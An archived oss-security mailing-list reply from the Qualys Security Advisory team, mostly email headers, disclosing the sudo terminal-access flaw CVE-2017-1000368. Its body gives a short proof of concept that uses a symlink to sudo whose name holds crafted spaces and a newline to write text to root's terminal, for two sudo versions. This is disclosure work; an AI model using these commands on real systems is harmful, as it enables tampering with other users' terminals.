X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["797" "Tuesday" "6" "June" "2017" "15:31:00" "-0700" "Qualys Security Advisory" "qsa@qualys.com" "<20170606223100.GD27224@localhost.localdomain>" "29" "Re: [oss-security] Arbitrary terminal access via sudo on Linux" "^Date:" nil nil "6" "2017060622:31:00" "[oss-security] Arbitrary terminal access via sudo on Linux" (number mark "        qsa@qualys.c Jun  6   29/797   " thread-indent "\"Re: [oss-security] Arbitrary terminal access via sudo on Linux\"\n") "<85f955b3d43c6455@courtesan.com>" ("<85f9558a0a5e1fa9@courtesan.com>" "<CANO=Ty2J67rVs2agjkgxQ65eGnAn=iUKXy16HpTrWay_XEQPPQ@mail.gmail.com>" "<85f955b3d43c6455@courtesan.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 6124 invoked by uid 550); 6 Jun 2017 22:38:27 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 1432 invoked from network); 6 Jun 2017 22:31:19 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=qualys.com; s=google;
        h=date:from:to:subject:message-id:references:mime-version
         :content-disposition:in-reply-to;
        bh=OcNmQgLhPJaCMZLC9PvpJWhggBp/Fnmg7oADiMA4Sm8=;
        b=lkpU1L8Nt1s7NQ4yc/JQBeaJAp7eqMlwJOUwXDrRBsjVlVPi8C8JYcc40v5LvrcUGc
         1syKGIAJmg07hNQvnu2Pu/ws+qf5lz+QCLoxpUAo1NIPC/eddfXtC3jrZqN4ZL7H9tnO
         a8ZPv0ut/qvzdCFyIX/M5AxTiTWomSFcNdSYUkzGfGctBmhSsboF3OF92pa+0fYZGscc
         0JBiA0S7IrAqcY/SZLgFfwZwbuqjhLmabz5qS6VZaby2Mh8Ah3sEeulj7X31ox+tp9QO
         FizwfRYJVOu+yS76fvStrvyzwwcAqXHumXXo+OR+ROcJOhFmytjRomY3ko0+ARboqtLF
         v83g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:date:from:to:subject:message-id:references
         :mime-version:content-disposition:in-reply-to;
        bh=OcNmQgLhPJaCMZLC9PvpJWhggBp/Fnmg7oADiMA4Sm8=;
        b=qcOTkmBBn1Bh5DB8qXsKeTtFaPRA/KVYc/A4QL7JcX2LTTluJIaRwqf/3HEYDOhb+t
         X+0Y9fSBDRdtZBiwvuyujb5jmdJkNCiPZ9RVL7wOWGwiOAn36dh6li2DS+IyyS4/fur2
         143syOm3k0S9+vd3qdXByJAEVrahTGdzlgYCF+m9g/3tkV4mVudcSLjt0w20jpZc0ZSo
         dXfF8uOR++fJscQbOhBFhfbyJ8oLlqZzLQZWH5e+CMfh3V5vkRIh/l/e5eJRkxkNrIXj
         vr9iuCRonKJkQMWvGjkWCZTrbzgty3mIyMdsCJdtSpCNiGbhFWDpPfXQn9GmOsOIilHw
         5kkg==
X-Gm-Message-State: AODbwcByXF4/UHnvuj03l3DYL0XG0vCJmXIfd2PjKyh6TwyoH/crPFHp
	liXUCop/S+259KQZebI=
X-Received: by 10.98.197.130 with SMTP id j124mr15472367pfg.239.1496788267006;
        Tue, 06 Jun 2017 15:31:07 -0700 (PDT)
Message-ID: <20170606223100.GD27224@localhost.localdomain>
References: <85f9558a0a5e1fa9@courtesan.com>
 <CANO=Ty2J67rVs2agjkgxQ65eGnAn=iUKXy16HpTrWay_XEQPPQ@mail.gmail.com>
 <85f955b3d43c6455@courtesan.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <85f955b3d43c6455@courtesan.com>
Date: Tue, 6 Jun 2017 15:31:00 -0700
From: Qualys Security Advisory <qsa@qualys.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Arbitrary terminal access via sudo on Linux
To: oss-security@lists.openwall.com

On Fri, Jun 02, 2017 at 12:55:10PM -0600, Todd C. Miller wrote:
> However, the arbitrary tty access IS exploitable in 1.8.20p1.

For example, against Sudo < 1.8.20p1:

$ /usr/bin/sudo -l
...
User john may run the following commands on localhost:
    (nobody) /usr/bin/sum

$ ln -s /usr/bin/sudo '     1026 '
(1026 is tty2, currently used by root)

$ ./'     1026 ' -r unconfined_r -u nobody /usr/bin/sum $'--\nHELLO\nWORLD\n'
(this is written to root's tty2)

Or, against Sudo = 1.8.20p1:

$ ln -s /usr/bin/sudo $')     1026 \n'
$ ./$')     1026 \n' -r unconfined_r -u nobody /usr/bin/sum $'--\nHELLO\nWORLD\n'

CVE-2017-1000368 was assigned to this newline vulnerability:

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000368

With best regards,

-- 
the Qualys Security Advisory team
